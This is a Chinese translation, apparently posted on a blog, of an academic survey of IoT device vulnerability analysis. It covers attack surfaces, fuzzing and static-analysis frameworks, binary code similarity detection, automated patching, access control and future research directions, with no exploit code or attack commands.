<p>硬件层面的攻击不同于传统的安全领域，它主要包括三个角度：不安全的调试接口、未保护的闪存芯片、硬件敏感信息的泄露</p>
<ol>
<li>不安全的调试接口当IoT设备被制造的时候，调试接口比如UART会被留在电路板上以便维修。如果它缺少身份验证或者仅有弱身份验证，攻击者就可以通过接口来获得高权限，对固件进行修改或者替换。调试接口在IoT安全检查中排在第一位</li>
<li>未保护的闪存芯片因为闪存通常用来存储固件，因此也成为了关注的重点。如果芯片没有读写保护，安全研究者就可以通过读取固件来分析或者修改固件，来绕过接口的身份验证</li>
<li>硬件敏感信息的泄露<br>
硬件电路的密封性并不好，诸如声音和电量消耗的硬件信息泄露可以造成侧信道攻击[^28-^31]，攻击者可以由此获得重要的信息，比如密钥。</li>
</ol>
<h4 id="3-3-2-a-name-1-a-软件层">3.3.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>软件层</h4>
<p>软件层面的攻击对应着设备构成中bootloader和固件的软件部分，它主要包括以下五个方面：不安全的bootloader、不安全的操作系统、固件敏感信息泄露、不安全的应用服务、不正确的配置策略</p>
<ol>
<li>不安全的bootloader因为bootloader是一段在设备运行后加载的代码，因此是一个容易被忽略的攻击点。它的功能是初始化并加载固件，因此当问题出现时它的危险程度很高。例如checkm8这个Boot ROM 漏洞被称为是iphone、ipad、apple TV和 apple watch上的史诗级漏洞</li>
<li>不安全的操作系统由于研发周期短和轻量化的需求，IoT设备的操作系统内核是定制的，版本也不经常更新，这导致了大量的缓冲区溢出问题，如提权等。除此之外，设备使用了各种各样的传感器和通信模块，包括内核中大量的驱动。例如，Marvell WiFi芯片驱动找到了多个漏洞，包括 CVE-2019-14901, CVE-2019-14897 和CVE-2019-14896，它们导致了内核中基于栈或堆的缓冲区溢出。这也是攻击面中重要的一部分</li>
<li>固件敏感信息泄露IoT设备的本地存储通常使用轻量化的存储方案，开发者通常忽略了它的安全性，并使用了明文或只是进行了简单的加密，这很容易导致敏感数据的泄露</li>
<li>不安全的应用服务应用服务开发缺少安全标准。为了加快产品的开发，通常直接编译、使用了简单、不安全的应用代码，因此引入未知的漏洞。IoT安全研究者们已经发现了大量开发时产生的应用漏洞，包括出于未知原因留下的后门</li>
<li>不正确的配置策略<br>
为了方便管理IoT设备，ssh、telnet等服务是默认的开启，这样会造成配置问题。默认配置下的弱验证策略使攻击者容易获得设备的权限。例如，Telestar Digital GmbH 的物联网收音机可通过未经验证的telnet服务器被远程攻击者劫持利用[^34]，这些漏洞已经被CVE-2019-13473[^35]和CVE-2019-13474[^36]收录。</li>
</ol>
<h4 id="3-3-3-a-name-1-a-协议接口层">3.3.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>协议接口层</h4>
<p>协议接口层的攻击包括了通信和API，它涉及到用户侧直接控制和由云端间接控制的设备，以及以上两种通信过程中的信息保护问题，并不涉及到协议的安全。例如，IoT通信协议的滥用和AR-Ddos[^37]攻击正是通过IoT通信协议CoAP[^38]、SSDP[^39]和SNMP执行的，它的目标不是IoT设备，但是它也是IoT安全一个重要的研究方向。协议接口层的攻击主要包括一下三个角度：不安全的远程管理接口、数据传输过程中的信息泄露、弱身份验证</p>
<ol>
<li>不安全的远程管理接口为了方便管理，IoT设备使用http服务之类的远程管理方式，这带来了诸多漏洞，例如sql注入、XSS和远程执行漏洞等</li>
<li>数据传输过程中的信息泄露IoT通信协议使用了弱加密算法或者根本不进行加密，导致敏感信息泄露。例如论文<em>Passwords in the Air</em>[^40]中提到的，当IoT设备接入网络时，WiFi密码以明文传输</li>
<li>弱身份验证<br>
由于安全需要，管理IoT设备需要身份验证绑定，于是产生了一个新的攻击面。攻击者可以绕过身份验证，重复绑定然后获得用户的信息，论文<em>Phantom Device Attack</em>[^41]在这个攻击面上找到了四种攻击方法</li>
</ol>
<h2 id="4-a-name-1-a-漏洞分析、挖掘、检测和缓解">4. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞分析、挖掘、检测和缓解</h2>
<p>现阶段，对IoT安全没有精确的分类，此外，安全研究的核心在于漏洞，因此我们把重点放在设备的漏洞。在研究周期中，研究分为三个阶段：挖掘、检测和缓解。因为IoT安全的特殊性导致不可能有用于分析的标准接口，因此，针对物联网的基础分析框架的研究内容也很有价值。为了审视现有的物联网安全技术，我们从以下四个角度进行总结：（1）漏洞分析的基础框架的研究，使用了固件模拟来帮助分析IoT安全问题；（2）漏洞挖掘技术研究，主要针对挖掘IoT设备中的未知漏洞的手段；（3）漏洞检测，研究基于现有漏洞的特征来检测已知漏洞；（4）漏洞缓解技术的研究，研究了自动修复漏洞或者加入访问控制来限制恶意行为。另外，这节总结的IoT漏洞分析技术需要一系列前提条件，例如固件提取[^42]，因此我们标注了技术要求，但并不总结它们。</p>
<h3 id="4-1-a-name-1-a-漏洞分析的基础框架研究">4.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞分析的基础框架研究</h3>
<p>为了解决人们对物联网安全的担忧，即使没有源代码或者硬件资料，对固件二进制文件的准确分析也极为重要[^43]。然而，由于缺少专门的基础框架，IoT安全领域的漏洞分析收到了阻碍。例如，动态分析依赖于在可控的环境（通常是设备化的模拟器[^43]）中执行程序，因此基础框架主要提供了通过半仿真和全仿真的功能。它可以进行复杂的动态分析以支持IoT安全研究。**技术要求：**能够获得IoT设备固件对于缺少专门用于分析固件，特别是用于动态分析的工具，Avatar[^43]提出了一个结合了在模拟器上的模拟执行模式和在真实设备上的实际执行模式的框架来分析固件。当固件在模拟模式下运行时，当发生I/O时，Avatar将操作转发到设备，设备执行操作后将结果传给模拟器，以便模拟器继续运行。它有效地应对了特定外围设备缺少源码和文档的问题。随后，Prospect[^44]和Surrogate[^45]也提出了类似的动态分析框架。四年后，Avatar开发团队开发出了Avatar2[^46]，允许安全研究者在不同动态分析框架、调试器、模拟器和实际设备之间交互操作，除此之外，作者还展示了如何使用Avatar2来记录设备的执行流。Chen等人[^47]提出了用于linux设备的Firmadyne，首先使用软件进行系统仿真，然后采用扫描和探测等动态分析方法来挖掘漏洞。以上框架的模拟功能都基于QEMU[^48]。对于不易模拟的传感器操作，半模拟框架[^43-^46]在执行表1的固件指令时，通过软件代理的方式引导对物理硬件的I/O操作</p>
<ul>
<li><strong>表1</strong>是漏洞分析基础框架的总结。<br>
Semi-simulation指的是框架需要真实的设备来进行I/O访问<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613214401.png" alt="20210613214401"></li>
</ul>
<h3 id="4-2-a-name-1-a-漏洞挖掘技术研究">4.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞挖掘技术研究</h3>
<p>随着IoT设备漏洞的增加和攻击趋势的上升，安全研究者在设备的漏洞挖掘上花费越来越多时间。这一届表述了漏洞挖掘的技术，包括动态和静态分析。通过学习传统的软件安全分析技术，我们发现动态分析主要包括fuzz[^49]和污点检测[^50]，静态分析主要包括符号执行[^51]、污点分析、数据流分析[^50]。</p>
<h4 id="4-2-1-a-name-1-a-动态分析方法">4.2.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>动态分析方法</h4>
<p>动态分析方法需要仿真固件工具来进行动态调试，或者在物理设备上进行片上调试，来获得反馈信息。主要通过fuzz来得到漏洞的触发点<br>
**技术要求：**在IoT设备上进行动态调试的能力<br>
在卡片安全研究领域，Alimi等人[^52]使用了一个通用的算法生成测试样本，对手机卡和银行卡进行fuzz。对于现在一些内置web服务器的智能卡片，Kamel等人[^53]发现了一些基于HTTP协议生成方式的bug，并据此对web服务器进行了fuzz。在汽车安全领域，Koscher[^54]和Lee[^55]通过修改发送给CAN的数据包来改变汽车的状态[^56]，来对汽车的智能系统进行fuzz。<br>
因为IoT固件提取的困难，IoTFuzzer[^57]通过从用户侧捕获崩溃信息来避免了这个问题。首先，它在手机应用中的交互协议代码里插桩，然后修改从桩获取的数据，最后根据心跳包（Heartbeat packet）和响应来判断fuzz的效率。因为设备很难直接调试，研究者开始结合仿真技术来发现漏洞。Costin等人[^58]实现了应用动态固件分析技术来进行嵌入式固件镜像中web接口的漏洞自动化挖掘框架。最近，Srivastava等人的目标不再仅限于web接口，他们展示了FirmFuzz[^59]，一个独立于设备的、针对Linux固件镜像的自动化仿真和动态分析框架。Zheng等人[^60]提出了Firm-AFL，它是第一个针对IoT固件的高吞吐量灰盒fuzzer，他们扩展了AFL[^61]，把它变成了现在IoT领域最流行的fuzzer。对于fuzz的研究，Muench等人分析了传统的IoT设备异常状态检测方法的通用性，然后实现了一个基于Avatar[^43]和[^63]的系统，另外，他们比较了黑盒fuzzer在不同配置下的吞吐量，包括本机执行（直接向硬件输入）、部分仿真（仅将硬件请求重定向到硬件）、全仿真[^60]，这是一项对漏洞分析技术性能的评估。上述提到的动态分析技术发现的漏洞类型详见表2，主要是内存问题例如缓冲区溢出和空指针解引用，由于对web接口进行了研究，也有一些web服务器漏洞例如XSS、SQL注入。</p>
<h4 id="4-2-2-a-name-1-a-静态分析方法">4.2.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>静态分析方法</h4>
<p>静态分析不需要运行固件就可以挖掘漏洞。寻找bug的过程可以理解程序代码，因此它具有可扩展性。**技术要求：**能够获得IoT设备的固件静态分析步骤如下：（1）提取固件，（2）逆向固件中的程序，（3）通过人工审计找到安全问题。在学术界，研究人员主要探索通过自动化静态分析方法来找到漏洞。在表2，我们总结了静态分析的研究目标、细分的技术和发现的漏洞种类。Costin等人[^64]首先自动化分析了大量嵌入式设备的固件。他们自动解压运行了固件，然后使用模糊哈希来匹配固件中的弱密钥。FIE[^65]基于KLEE[^66]构建了嵌入式设备的符号执行引擎。它制定了内存规范、中断规范、芯片规范，以发现固件中违反自定义安全规范的问题。Firmalice[^67]也是一个基于符号执行的框架，它通过后门的输入确定性来找到身份验证绕过漏洞。SainT[^68]和DTaint[^69]提出了静态污点分析方法，分别在设备软件或二进制代码上挖掘漏洞。</p>
<ul>
<li><strong>表2</strong>：<br>
BO=缓冲区溢出漏洞；NPD=空指针解引用；CL=命令注入；CSRF=跨站请求伪造<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210614224801.png" alt="20210614224801"></li>
</ul>
<h3 id="4-3-a-name-1-a-漏洞检测研究">4.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞检测研究</h3>
<p>前面提到的动态和静态分析技术也可以应用于检测已知的漏洞。在大规模的检测场景，动态分析依赖于使用架构专用的工具来执行程序，静态分析检测已知漏洞的方式和发现0day漏洞的方式相同，但提高了性能和耗时。目前，研究者主要使用以下两种方法：网络扫描和代码相似性检测。</p>
<h4 id="4-3-1-a-name-1-a-网络扫描">4.3.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>网络扫描</h4>
<p>网络扫描通过向在线的IoT设备服务发送带有payload的探测包来检测已知漏洞。网络扫描在安全领域更为通用，随着IoT安全的发展，产生了网络扫描物联网设备的议题。<br>
**技术要求：**了解漏洞的有关信息，如POC<br>
Cui等人[^70]扫描了网络上存在的嵌入式设备，发现了一系列设备含有弱密码和其他漏洞。在2013年后，搜索引擎例如Shodan[^71]和Censys[^72]以及Zoomeye[^73]产生了，它们能够识别和检测弱密码、后门、和已知的漏洞。然而，仅靠外部扫描只能发现一小部分漏洞，而且，未授权扫描联网设备也存在道德问题。因此，网络扫描漏洞常常在内网和实验室中进行。网络扫描的优点在于从服务层进行检测并不需要考虑设备的结构，并且它高效快速，适合大规模测试。现有的商用漏洞检测系统大多基于这种方法。</p>
<h3 id="4-4-a-name-1-a-相似性检测">4.4. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>相似性检测</h3>
<p>由于IoT设备中存在大量没有修复过的已知漏洞，安全研究员们提出软件代码相似性检测方法来检测已知漏洞。在现阶段，相似性检测的研究主要针对传统软件安全领域，然后通过跨架构逐步支持物联网设备，而不存在专门研究IoT固件相似性检测的论文。如图4，相似性检测的基本思路是从代码中提取原有特征，如字符串、指令序列、基本块、语法树和函数调用图等，接着，通过算法测量特征的相似度，最终确定相应的代码片段中是否存在漏洞。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210615165124.png" alt="图4.相似性检测结构"></p>
<p>**技术要求：**获得IoT设备固件</p>
<h4 id="4-4-1-a-name-1-a-源代码相似性检测">4.4.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>源代码相似性检测</h4>
<p>对于在源代码上检测已知漏洞， CP-Miner[^74]提出了基于token的方法，使了用词法分析器来产生token序列，然后搜索重复的token序列来衡量相似性。ReDeBug[^75]提出了一个可扩展的方法，它结合代码补丁来确定修复前的漏洞代码的特征，并且可以识别未打补丁的代码。然而，以上基于源代码的方法并没有应用在IoT上，在绝大多数情况下，安全研究员们无法获得固件的源代码。</p>
<h4 id="4-4-2-a-name-1-a-二进制代码相似性检测">4.4.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>二进制代码相似性检测</h4>
<p>对于在二进制代码上检测已知漏洞，研究者主要面临的问题是，不同的编译器代码生成算法、编译优化选项以及不同指令集导致难以检测相似性。N-Grams[^67]和N-Perms[^77]是早期的漏洞搜索方法[^78]。Karim等人使用内存中的二进制片段或代码来匹配算法，由于没有对代码语义进行了解，这种方法难以应对不同编译级别带来的指令重排序问题。为了提升匹配的准确性，Tracelet-based[^80]提出将代码重构为可执行序列，然后使用求解器来处理程序约束和数据约束，因此它解决了指令重排序的问题。此外，TEDEM[^81]采用符号简化二进制程序，并通过树编辑距离作为基本块来判断代码相似性，它甚至可以找到不同操作系统的漏洞。<br>
由于一些相同的语义特征，导致难以表示两个二进制程序基本块特征相似性。研究者开始考虑使用CFG[^82]来描述程序的行为，因此可以通过图来进行相似性比较。BinDiff[^83]和Binslayer[^84]能够通过检测CFG相似度，来检查两个二进制程序的相似性，不过它们并不是专门为漏洞检测设计的。通过比较两个完全不同的二进制文件的CFG，还是难以发现跨平台的漏洞片段。Egele等人[^85]提出了Blanket Execution 并指出，基于静态分析的二进制语义相似性研究容易受编译链和编译优化级别的影响。因此他们建议提取程序动态运行时的特征，来应对造成CFG改变的影响。BinHunt[^86]和iBinHunt[^87]使用了符号执行和理论证明，来检查基本块之间的语义等价性，并找出哪些语义有所不同。<br>
然而不同IoT设备的固件差异很大，包括多种架构如MIPS、ARM、PPC、x86等，它们的操作码、寄存器名称和内存寻址方式都有差别，因此，以上提到的方法难以应用于大规模的跨架构代码漏洞检测。直到最近两三年，研究人员开始研究二进制代码基础上的跨架构代码相似性检测[^88-^90]。Multi-MH[^88]是第一个基于二进制代码的跨架构代码相似性检测方法。首先，将二进制代码转换为中间代码，然后使用特定的输入来测试程序，并根据I/O的行为来捕获基本块的语义，最后根据捕获的CFG来检测漏洞。然而它在处理大量函数时的性能开销过大。DiscovRE[^89]通过图匹配算法检查一组函数对的CFG是否相似，并通过预筛选来加快CFG匹配过程。然而它的预筛选过程并不可靠且会漏报过多漏洞。BinGo[^90]通过引入选择性内联相关库函数以及用户定义的用于跨平台代码搜索的函数来捕捉完整功能语义。然而它并不是特别为IoT设备设计的。Genius[^91]使用机器学习的传统方式，从CFG学习高层特征表征。另外，它将图嵌入[^92]编码为一个高位数字特征向量，然后使用图匹配算法测量目标函数和一组二进制函数的相似性，这可以有效的提升性能和可扩展性。Xu等人[^93]首先提出了基于深度学习的跨架构二进制代码相似性检测方法，使用了神经网络模型的图嵌入技术。在跨版本代码相似性检测，αDiff[^94]迈出了重要的一步。它基于DNN模型，提取了三个语义特征，包括函数、功能间和模块间的特征，来进行检测。Gao等人提出了VulSeeker[^95]和VulSeeker-Pro[^96]。这些漏洞搜索方法都通过与深度学习结合，来提高检测的准确性，后面提到的两种方法被证实比目前其他的（例如Gemini[^93]）方法准确度都高。</p>
<h3 id="4-5-a-name-1-a-漏洞缓解研究">4.5. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞缓解研究</h3>
<p>在漏洞挖掘和检测的基础上，漏洞缓解措施也是行业关注的一个研究问题。根据公开的文献研究，主要研究热点是自动化生成补丁和访问控制。前者旨在修复漏洞，后者研究如何限制恶意行为。</p>
<h4 id="4-5-1-a-name-1-a-自动化生成补丁">4.5.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>自动化生成补丁</h4>
<p>这节所说的自动化生成补丁技术并不专指IoT领域，而是一个传统安全领域的扩展。漏洞修复通常由开发团队在源代码上完成。在获得外部漏洞报告后，他们通过漏洞触发条件和分析漏洞机制来评估漏洞。自动生成补丁可以自动修复软件错误，而不需要开发者人工判断、理解、修正。[^97]<br>
**技术要求：**获得和升级IoT设备固件<br>
软件工程领域的研究者们提出，通过学习正确的c语言[^97,^98]、Java[^99]和其它源代码级别中的正确代码可以自动生成补丁，这一想法取得了初步可行成果。另一种想法是改变程序的形式而不改变它的功能。GenProg[^100]使用了遗传编程的扩展形式来演化程序变体，该变体保留了所需功能但不易受到给定缺陷的影响，然而由于突变操作的随机性，它会生成无意义的补丁。因此Kim等人[^101]提出了基于模式的自动化程序修复（PAR）来解决上述的问题。在安卓平台上，Zhang等人[^102]提出了AdaptKpatch，一个自适应内核修补程序框架和LuaKpatch，它将一个类型安全的动态语言引擎插入内核来执行补丁。这两个方案解决了安卓平台的补丁链过长、碎片化和平台生态布局不匹配、细分修复不及时的问题。然而它们没有考虑解决在跨CPU架构自动进行热修复的问题，他们依旧需要基于知识和经验进行手工编写。DARPA的CGC[^103]引领了在二进制代码级别上的自动化防御方法，然而主要采用的依旧是通用的防御方法，例如二进制代码加固、边界检查和指针修复[^106]</p>
<h4 id="4-5-2-a-name-1-a-访问控制">4.5.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>访问控制</h4>
<p>访问控制方法是通过管理IoT设备的用户侧或平台许可，来阻止或结束攻击者的恶意行为。<br>
**技术要求：**用户侧或云端的可扩展性<br>
Fernandes等人[^107]首先深入研究了IoT平台的安全例如SmartThings，他们发现，由于功能粗粒度，大量的应用获得了多余的权限，<br>
智能家居中的许多设备获得了过多的权限，模糊的权限管理，导致了许多针对IoT设备的攻击以及隐私泄露。密歇根大学的研究者们想出了一系列办法来解决这些问题。2016年，他们提出了Flowfence[^108]，一个基于数据流来保护隐私泄露的系统，它将程序分为两部分：（1）一系列负责操作沙箱中敏感数据的隔离的模块。（2）不操作敏感数据，但通过污点跟踪不透明的句柄将隔离的模块链接在一起来协调执行的代码，其中涉及到的数据的数据只能在沙箱内被解引用。于是在2017年，他们又提出了基于上下分信息的ContextIoT[^109]，它可以帮助用户提升访问控制的有效性，通过识别敏感操作上下文标识和保证运行时的上下文完整性，来抵御攻击者进行危险操作。2018年，一个针对智能家居的基于风险控制的模型Tyche[^110]被提出，它建立了访问控制列表（ACCLs），在源代码层面解决访问权限过多的问题。Smartauth[^111]和FACT[^112]同样基于ACCLs，然而他们采取了不同的方法来建立ACCLs。Smartauth通过NLP识别的文件和APP源代码建立ACCLs，FACT在设备开发的阶段就建立了ACCLs。</p>
<!--↑-->
<h2 id="5-a-name-1-a-讨论">5. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>讨论</h2>
<p>在前面几节，我们深入探索了目前关于IoT漏洞分析技术的研究。在这一节，我们首先评估了漏洞分析技术，其次，通过评估指出现阶段研究的难点，最后提出了应对这些难点的技术机会。</p>
<h3 id="5-1-a-name-1-a-评估">5.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>评估</h3>
<p>在表3，我们从5个角度进行评估，包括攻击面、技术要求、支持的架构、支持的操作系统和是否与AI结合。在漏洞分析过程中，研究者需要仿真、调试接口、网络流量等方面的技术支持。例如，IoTFuzzer[^57]使用了把目标转移到APP的外围系统分析方法。这种方法优点是能更好的避免架构的复杂性，	缺点是粗粒度的崩溃信息阻碍了对漏洞的进一步分析。从这些角度的的评估能够更容易的对技术难题和未来的发展趋势进行分析。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616193125.png" alt="20210616193125"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616193206.png" alt="20210616193206"></p>
<h3 id="5-2-a-name-1-a-难点">5.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>难点</h3>
<p>前面的评估反映出当今IoT设备上的漏洞分析存在的难题。如表4中展示出的，不同技术领域对研究的影响不同，至于IoT设备漏洞分析需要的技术，现存的难题如下：</p>
<ul>
<li>**表4：**这张表总结了难点和机会的影响范围，影响的范围包括四种：IoT分析的基础框架（T1）、漏洞挖掘技术（T2）、漏洞检测技术（T3）、漏洞缓解技术（T4）。√=难点或机会和这个领域的技术有关<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616202548.png" alt="20210616202548"></li>
</ul>
<h4 id="5-2-1-a-name-1ComplexityandHeterogeneityofDevice-a-（1）设备的复杂性和异构性">5.2.1. <code>&lt;a name='1ComplexityandHeterogeneityofDevice'&gt;&lt;/a&gt;</code>（1）设备的复杂性和异构性</h4>
<p>这个问题一直都是IoT设备漏洞分析技术的最大难点，IoT设备的差异性比PC和手机都大。它使用了多种CPU架构如ARM、MIPS、x86，以及不同的操作系统如Linux、Windows和安卓，它通常使用定制化的固件和内存使用，这使得难以直接在IoT领域应用行业上的自动化检测、挖掘漏洞技术。IoT设备的复杂性使得静态和动态调试更加难以进行。我们发现现阶段主要选择路由器等基于arm的Linux设备来作为研究对象。相似性检测方面的研究扩展到了跨架构的场景[^88-^91,^93-^96]。其他研究并没有遇到这个问题。</p>
<h4 id="5-2-2-a-name-2Limitationsofdeviceresources-a-（2）设备资源的限制">5.2.2. <code>&lt;a name='2Limitationsofdeviceresources'&gt;&lt;/a&gt;</code>（2）设备资源的限制</h4>
<p>由于产品轻量化的需求，IoT设备大多运行在精简的操作系统，或者甚至只在微控制器上运行一个程序。上述原因造成了设备资源有限的特点。对于IoT设备安全测试来说，通过向目标部署相关分析模块，来实现对运行程序外围的监控分析并不容易。安全研究者并不能使用传统的安全分析手段和工具，他们需要重构分析平台。另外，由于设备硬件的计算能力有限，动态分析的性能下降了。最近几年，研究者开发了一套仿真系统，在基础架构[^43-^47]和漏洞挖掘[^56,^60,^64]领域应对了这个问题。然而这个问题还没有完全解决，且会是一个长期的难题。</p>
<h4 id="5-2-3-a-name-3Closed-SourceMeasures-a-（3）闭源措施">5.2.3. <code>&lt;a name='3Closed-SourceMeasures'&gt;&lt;/a&gt;</code>（3）闭源措施</h4>
<p>对于常规的软件，我们可以在源代码或二进制程序层面挖掘或检测漏洞，对于IoT设备制造商，由于他们的闭源措施，这些方法并不能使用。代码审计，例如[^3.3.2]节的&quot;源代码层面的相似性分析&quot;不再适用于IoT漏洞分析。他们甚至对固件进行加密、加强对串行调试接口的身份验证，并且认为这样会更加安全。例如Dlink-882(867,878)、360 clear robots最新的固件都被加密了。因此，基于源代码、固件和调试接口的漏洞分析变得越来越困难。通过之前的评估，我们发现近两年的漏洞挖掘和检测技术已经绕开了调试接口[^59,^60]和固件，然而又出现了信息不完整等问题。</p>
<h3 id="5-3-a-name-1-a-机会">5.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>机会</h3>
<p>IoT的特点不仅给漏洞分析带来了难题，同时也带来了新的机会。</p>
<h4 id="5-3-1-a-name-1AI-a-（1）AI技术的应用">5.3.1. <code>&lt;a name='1AI'&gt;&lt;/a&gt;</code>（1）AI技术的应用</h4>
<p>在最近几年，AI和IoT两种新技术已经出现了结合，促进社会进入了AIoT的时代。AI技术的发展也给IoT安全带来了新的措施和解决方案。如今，出现了运用AI进行访问控制[^111]和相似性检测[^89-^91,^93-^96]的研究，随着IoT和AI的发展，新的漏洞挖掘、检测和缓解技术不可避免的出现了，当AI应用在IoT设备上时，这同时也是AI对抗攻击和防御的新机会。例如，攻击者污染智能音箱的数据集，诱导它对某些问题回复一些负面信息（辱骂性词语），而安全研究者们通过改进AI算法来避免这类问题。</p>
<h4 id="5-3-2-a-name-2-a-（2）对第三方和开源代码的依赖">5.3.2. <code>&lt;a name='2'&gt;&lt;/a&gt;</code>（2）对第三方和开源代码的依赖</h4>
<p>IoT固件开发依赖了大量第三方和开源代码，制造商通常只把新功能、高性能和低功耗作为产品的主要目标，同时尽可能缩短开发周期以提升市场竞争力。因此，他们采用了敏捷开发。许多IoT设备制造商直接重复使用开源代、参考公共代码实现、交叉编译PC平台的代码、依赖第三方库。Cui等人[^113]发现80.4%的打印机固件在发布时包含大量已知漏洞，许多最新的固件升级包仍然含有第三方库漏洞，有些漏洞在8年前就已经披露。尽管这件事情暴露了大量安全问题，但仍然带来了独特的漏洞挖掘技术，可以通过不同层次信息的相似性来挖掘同源漏洞。相似性检测也将推动IoT领域的应用程序。</p>
<h4 id="5-3-3-a-name-3-a-（3）外围设备系统的开发">5.3.3. <code>&lt;a name='3'&gt;&lt;/a&gt;</code>（3）外围设备系统的开发</h4>
<p>IoT设备的交互性越来越强，它逐渐提升促进IoT外围设备的发展。IoT设备通常使用终端（PC和手机）、云端和其他系统进行交互。这不仅增加了新的攻击面，同时有助于外围设备分析技术的发展，以解决固件提取集和分析的困难。例如，现有的IoTFuzzer[^57]和访问控制框架[^108-^112]都具备对于外围系统的自动分析和保护技术。</p>
<h2 id="6-a-name-1-a-研究方向">6. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>研究方向</h2>
<p>在前面几节中，我们介绍了面临的难题和机会，我们发现IoT漏洞挖掘、检测和环节技术延续了传统安全研究的轨道，但同时也有其不同的研究方向。</p>
<ul>
<li><strong>基于AI的漏洞挖掘和分析技术</strong>不论是在功能还是安全上，IoT和AI技术都在迅速结合。现有的AI技术成功运用在了漏洞检测上。随着研究的继续，AI会扩展到其他的漏洞分析技术上。例如，GANs[^114]已经应用在了IoT系统异常行为检测上[^115]。在未来，GANs或许可以应用在IoT漏洞挖掘领域，因为它可以学习不同的攻击场景，来生成类似0day攻击的样本，并为算法提供一系列现有攻击外的样本。</li>
<li><strong>大规模漏洞检测技术</strong>在4.2节中提到，IoT设备的复杂性和异构性妨碍了大规模、自动化的漏洞分析技术研究。然而，这个技术需求在IoT安全产业已经迫在眉睫。安全研究者需要一个跨平台方案来克服这个问题，这也是一个长期的研究方向。</li>
<li><strong>自动化漏洞利用</strong><br>
为了利用IoT设备中的漏洞并保护设备免受入侵，我们需要自动化生成poc，因为它能帮助更好理解漏洞的危害和成因。随着IoT领域的发展，自动化攻击和防御也将成为热点。</li>
<li><strong>外围设备的漏洞分析</strong><br>
通过之前对现有难题的分析，我们发现难以通过静态和动态分析直接分析设备。IoT设备的交互性变得越来越强，不仅与外围系统结合的漏洞会越来越多，对外围系统的分析方法的研究也会增加。</li>
<li><strong>在二进制代码层面自动生成多平台补丁</strong><br>
由于一些IoT厂商将代码闭以及和不注重安全性，设备固件没有办法及时打上补丁。为此，我们需要跨平台二进制代码漏洞自动化修复方案。自动化生成二进制代码层的补丁需要完全理解Bug的成因和消除方法。如果我们完全依赖该领域专家的知识，将会出现数以千计的安全漏洞模板，因此难以达成可扩展且可行的解决方案。同时，操作系统和硬件架构的多样性也带来了技术上的难题。解决自动生成多平台的二进制代码补丁这一难题，将是全安全领域一个长期的目标。</li>
</ul>
<h2 id="7-a-name-1-a-结论">7. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>结论</h2>
<p>随着IoT的迅速发展，确保用户的安全和隐私保护带来了显著的影响和挑战。虽然关于IoT设备安全的研究数量逐渐上升，但在信息安全的领域仍然处于起始阶段。因此，需要一个对于现有研究的综合摘要来指引IoT安全的发展。这篇论文分析了消费者层和产业层的IoT设备架构和攻击面，展示了当前研究的背景。我们首先从四个方面完善了分类：分析工具、漏洞挖掘、漏洞检测和漏洞缓解。基于这四个方面，我们回顾了漏洞分析的技术。另外，我们总结了目标、特点和研究方向。随后，我们评估了漏洞分析的技术，发现现有研究面临的难点，包括设备的复杂性和异构性、设备资源的限制、长期闭源的措施。困难同样伴随着机会。AI技术和外围设备分析将会广泛应用在IoT安全领域。在未来，将会有越来越多的技术和新领域结合，来实现大规模、跨架构的自动化漏洞分析。</p>
<h2 id="8-参考">8. 参考</h2>
<p>[^1]: Lueth, K.L. State of the IoT 2018: Number of IoT Devices Now at 7B—Market Accelerating. Available online:<span class="exturl" data-url="aHR0cHM6Ly9Jb1QtYW5hbHl0aWNzLmNvbS9zdGF0ZS1vZi10aGUtSW9ULXVwZGF0ZS1xMS1xMi0yMDE4LW51bWJlci1vZi1Jb1QtZGV2aWNlcy1ub3ctN2Iv">https://IoT-analytics.com/state-of-the-IoT-update-q1-q2-2018-number-of-IoT-devices-now-7b/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^2]: Rawlinson, K. Internet of Things Research Study. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3c4LmhwLmNvbS91cy9lbi9ocCVFRiVCRiVCRW5ld3MvcHJlc3MtcmVsZWFzZS5odG1sP2lkPTE3NDQ2NzY=">https://www8.hp.com/us/en/hp￾news/press-release.html?id=1744676<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^3]: Wikipedia. Mirai(malware). Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWlyYWlfKG1hbHdhcmUp">https://en.wikipedia.org/wiki/Mirai_(malware)<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^4]: Trevor, H. Internet of Things (IoT) History. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cucG9zdHNjYXBlcy5jb20vSW9ULWhpc3Rvcnkv">https://www.postscapes.com/IoT-history/<i class="fa fa-external-link-alt"></i></span>(accessed on 6 December 2019).Future Internet 2019, 12, 27 18 of 23</p>
